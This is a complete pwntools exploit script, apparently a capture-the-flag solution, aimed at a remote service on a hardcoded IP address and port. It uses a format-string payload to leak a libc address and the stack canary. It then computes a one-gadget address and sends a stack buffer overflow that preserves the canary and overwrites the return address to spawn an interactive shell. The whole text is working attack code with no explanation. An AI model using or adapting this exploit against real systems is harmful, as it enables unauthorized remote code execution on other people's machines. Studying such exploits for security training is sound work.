from pwn import *

p = remote("103.152.242.116", 20378)

# get leak libc & canary

leak = "%17$lx.%11$lx"
p.recvuntil(b">>>")
p.sendline(b'1')
p.recvuntil(b'masse?')
p.sendline(leak.encode())
parse = p.recvuntil(b'tunggu')
parse = parse.decode('utf-8')
parse = parse.replace(' saya bikinin masse monggo di tunggu', '')
parse = parse.replace('\noke masse mau ini ','')
parse = parse.split('.')

libc = int(str("0x"+parse[0]), 16)
base = libc - 0x21c87
gadget = base + 0x4f2a5
canary = int(str("0x"+parse[1]), 16)

p.sendline() # back to the menu
p.recvuntil(b">>>")
p.sendline(b'2')
p.recvuntil(b'saran?')

load = b'a'*136
load += p64(canary)
load += b'A'*8 # goes into rbp
load += p64(gadget)

p.sendline(load)
p.interactive()
